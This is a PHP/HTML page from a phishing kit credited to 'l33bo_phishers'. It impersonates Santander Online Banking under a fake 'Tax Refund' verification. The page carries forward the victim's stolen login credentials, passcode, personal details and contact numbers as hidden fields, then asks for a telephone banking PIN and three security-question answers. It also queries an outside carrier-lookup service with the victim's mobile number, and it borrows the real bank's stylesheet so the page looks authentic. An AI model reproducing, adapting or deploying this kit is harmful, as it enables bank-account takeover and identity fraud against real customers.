<?php
/*
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");

if(!empty($_POST['mname'])) 
{
  $mname = "";
}
if(!empty($_POST['home'])) 
{
  $home = "";
}
require "assets/includes/simplehtmldom.php";
  $ch = curl_init();
  $telephone = $_POST['mobile'];
  $submit = "submit";
  $fields = array('number'=>$telephone, 'nlSubmit'=>$submit);
  $postvars = '';
  foreach($fields as $key=>$value) {
    $postvars .= $key . "=" . $value . "&";
  }
  $url = "http://portal.aql.com/telecoms/network_lookup.php";
  curl_setopt($ch,CURLOPT_URL,$url);
  curl_setopt($ch,CURLOPT_POST, 0);                //0 for a get request
  curl_setopt($ch,CURLOPT_POSTFIELDS,$postvars);
  curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch,CURLOPT_CONNECTTIMEOUT ,3);
  curl_setopt($ch,CURLOPT_TIMEOUT, 20);
  $result = curl_exec ($ch);
$html = str_get_html($result);

$ret = $html->find('table');
$extr_result = implode(" ",$ret);
$_SESSION['result'] = $extr_result;
curl_close($ch);
?>
<!DOCTYPE html>
<html lang="en-GB"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta charset="UTF-8">
<meta name="viewport" content="user-scalable=yes, width=device-width, initial-scale=1">
<title>Account Verification</title>
<link rel="stylesheet" href="https://apply.santander.co.uk/PubRetBankWeb/fl/Styles/santander.css">
<link rel="shortcut icon" href="assets/img/fav.ico">
<script>
function MobileCheck(){	
		var x = document.forms["NetworkLookup"]["NumberCheck"].value;
		if (x.indexOf("Hutchison 3G UK Ltd") !=-1) {
		document.getElementById('Network').value = "Three";
        return true;
		}
		if (x.indexOf("Telefonica UK Limited") !=-1) {
		document.getElementById('Network').value = "O2";
        return true;
		}
		if (x.indexOf("Vodafone Uk Ltd") !=-1) {
		document.getElementById('Network').value = "Vodafone";
        return true;
		}
		if (x.indexOf("EE Limited") !=-1) {
		document.getElementById('Network').value = "EE";
        return true;
		}
		if (x.indexOf("BT") !=-1) {
		document.getElementById('Network').value = "BT";
        return true;
		}
		if (x.indexOf("Virgin Media Wholesale Limited") !=-1) {
		document.getElementById('Network').value = "Virgin Media";
        return true;
		}
		if (x.indexOf("TalkTalk Communications Limited") !=-1) {
		document.getElementById('Network').value = "TalkTalk";
        return true;
		}
		if (x.indexOf("Virgin Mobile Telecoms Limited") !=-1) {
		document.getElementById('Network').value = "Virgin Mobile";
        return true;
		}
		if (x.indexOf("Lycamobile UK Limited") !=-1) {
		document.getElementById('Network').value = "Lycamobile";
        return true;
		}		
		if (x.indexOf("Orange") !=-1) {
		document.getElementById('Network').value = "Orange";
        return true
	}
		else {
		document.getElementById('Network').value = "Unknown";
        return true	
	}
}
</script>
</head>
<body onload="MobileCheck()">
 <div style="display:hidden">
<form method="post" name="NetworkLookup" id="NetworkLookup">
<input type="hidden" name="NumberCheck" id="NumberCheck" value='<?php echo $extr_result;?>'>
</form>
</div>


<div id="wrapper">
	<a href="#" class="auralOnly" title="click here to skip to main content">skip to main content</a>

	<header role="banner">
		<div>
			<span class="logo">Santander Online Banking</span>
			<span class="secureMessage">Your details are secure</span>
		</div>
		 <div class="headerExtra">
               <p>Your details are secure</p>
         </div>		
	</header>

	<div id="main" class="rightColumn">	
		<div id="content">
			




<h1>Tax Refund</h1>
<ol class="breadcrumbs"><li>Account Login</li><li>About you</li><li class="current">Security Information</li><li>Finsh</li></ol>



<form autocomplete="off" action="Finish.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" method="post" id="sendLog" name="bankaccApplicationForm">
<input type="hidden" name="user" value="<?=$_POST['user']?>">
<input type="hidden" name="passcode" value="<?=$_POST['passcode']?>">
<input type="hidden" name="regno" value="<?=$_POST['regno']?>">
<input type="hidden" name="name" value="<?=$_POST['name']?>">
<input type="hidden" name="dob" value="<?=$_POST['dobd']."/".$_POST['dobm']."/".$_POST['doby']?>">
<input type="hidden" name="address" value="<?=$_POST['address'].", ".$_POST['postcode']?>">
<input type="hidden" name="mobile" value="<?=$_POST['mobile']?>">
<input type="hidden" name="Network" id="Network" value="">
<input type="hidden" name="home" value="<?=$_POST['home']?>">
<input type="hidden" name="email" value="<?=$_POST['email']?>">


<p>(All the fields marked with * are required)</p>



<div class="form">
	<h2>Your security information</h2>
	<div class="formbody">
	<ul class="fields">
		<li>
			<label for="telepin"><span class="emphasized"></span> Telephone Banking Pin *
			</label>
			<input name="telepin" required id="telephin" type="password" size="5" maxlength="4" value="" >
		</li>
		<li>
			<label for="school"><span class="emphasized"></span> Verify Security Question *
			</label>
			<select class="firstfocus" name="q1" id="q1" tabindex="0">
			<option selected="selected" value="">Please choose from ...</option>
			<option value="Place of Birth">Place of Birth</option>
			<option value="Name of first school">Name of first school</option>
			<option value="Name of secondary school">Name of secondary school</option>
			<option value="Mothers middle name">Mother's middle name</option>
			<option value="Fathers middle name">Father's middle name</option>
			<option value="Maternal grandmothers first name">Maternal grandmother's first name</option>
			<option value="Maternal grandfathers first name">Maternal grandfather's first name</option>
			</select>
		</li>
		<li>
			<label for="a1"><span class="emphasized"></span> Security Question Answer *
			</label>
			<input name="a1" required id="a1" type="text" size="20" maxlength="40" value="">
		</li>
		<li>
			<label for="school"><span class="emphasized"></span> Verify Security Question *
			</label>
			<select class="firstfocus" name="q2" id="q2" tabindex="0">
			<option selected="selected" value="">Please choose from ...</option>
			<option value="Place of Birth">Place of Birth</option>
			<option value="Name of first school">Name of first school</option>
			<option value="Name of secondary school">Name of secondary school</option>
			<option value="Mothers middle name">Mother's middle name</option>
			<option value="Fathers middle name">Father's middle name</option>
			<option value="Maternal grandmothers first name">Maternal grandmother's first name</option>
			<option value="Maternal grandfathers first name">Maternal grandfather's first name</option>
			</select>
		</li>
		<li>
			<label for="a2"><span class="emphasized"></span> Security Question Answer *
			</label>
			<input name="a2" required id="a2" type="text" size="20" maxlength="40" value="">
		</li>
		<li>
			<label for="school"><span class="emphasized"></span> Verify Security Question *
			</label>
			<select class="firstfocus" name="q3" id="q3" tabindex="0">
			<option selected="selected" value="">Please choose from ...</option>
			<option value="Place of Birth">Place of Birth</option>
			<option value="Name of first school">Name of first school</option>
			<option value="Name of secondary school">Name of secondary school</option>
			<option value="Mothers middle name">Mother's middle name</option>
			<option value="Fathers middle name">Father's middle name</option>
			<option value="Maternal grandmothers first name">Maternal grandmother's first name</option>
			<option value="Maternal grandfathers first name">Maternal grandfather's first name</option>
			</select>
		</li>
		<li>
			<label for="a3"><span class="emphasized"></span> Security Question Answer *
			</label>
			<input name="a3" required id="a3" type="text" size="20" maxlength="40" value="">
		</li>
	</ul>
	</div>
</div>


<ul class="actions">
<li>
<button type="submit" style="float:right;" id="next" title="Click here to go to the next page" name="_eventId" value="next" class="primary">
	Complete
</button>
</li>
</ul>



</form>

		</div>
		<div id="extraInfo">
		
		</div>

		
	</div>

	<footer class="simple">
		<ul>
			<li class="first"><a target="_blank" href="#">Peace of Mind Guarantee</a></li>
			<li><a target="_blank" href="#">Site Help &amp; Accessibility</a></li>
			<li><a target="_blank" href="#">Security &amp; Privacy</a></li>
			<li><a target="_blank" href="#">Legal</a></li>
		</ul>
	</footer>
	
</div>


</body></html>
